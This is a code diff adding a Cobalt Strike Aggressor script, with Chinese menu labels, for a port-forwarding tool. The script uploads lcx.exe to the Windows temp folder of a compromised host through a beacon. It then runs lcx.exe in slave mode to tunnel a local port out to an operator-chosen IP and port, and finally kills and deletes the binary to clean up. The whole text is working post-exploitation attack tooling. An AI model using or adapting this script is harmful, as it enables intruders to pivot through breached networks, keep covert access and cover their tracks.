@@ -1,0 +1,38 @@
+menu "LCX" {
+	item "上传LCX" {
+		$bid = $1;
+		$dialog = dialog("上传LCX", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &LCX);
+		drow_text($dialog, "UploadPath",  "上传路径: "); 	
+		dbutton_action($dialog, "上传");
+		dialog_show($dialog);
+	}
+	sub LCX {
+	    bcd($bid, $3['UploadPath']);
+        bupload($bid, script_resource("/script/lcx/lcx.exe"));
+	}
+    
+	item "运行LCX"{
+		$bid = $1['@'];
+	    $Dialog = dialog("运行LCX", %(ip => "", port => "",bid => $bid),&lcx_run);
+	    drow_text($Dialog, "ip", "ip: ");
+	    drow_text($Dialog, "port", "port: ");
+	    drow_text($Dialog, "port1", "目标port: ");
+	    dbutton_action($Dialog, "运行");
+	    dialog_show($Dialog);
+	}
+	sub lcx_run{
+	    local('$Name $port');
+	    $Name = $3['ip'];
+	    $port = replace($3['port'], "\"", "");
+	    $port1 = replace($3['port1'], "\"", "");
+		bshell($bid, "lcx.exe -slave  $+ $Name  $+ $port 127.0.0.1  $+ $port1");
+	}
+
+	item "删除LCX"{
+		local('$bid');
+		foreach $bid ($1){
+			bshell($1, "TASKKILL /F /IM lcx.exe");
+			bshell($1, "del /f /s /q lcx.exe");
+		}
+	}
+}
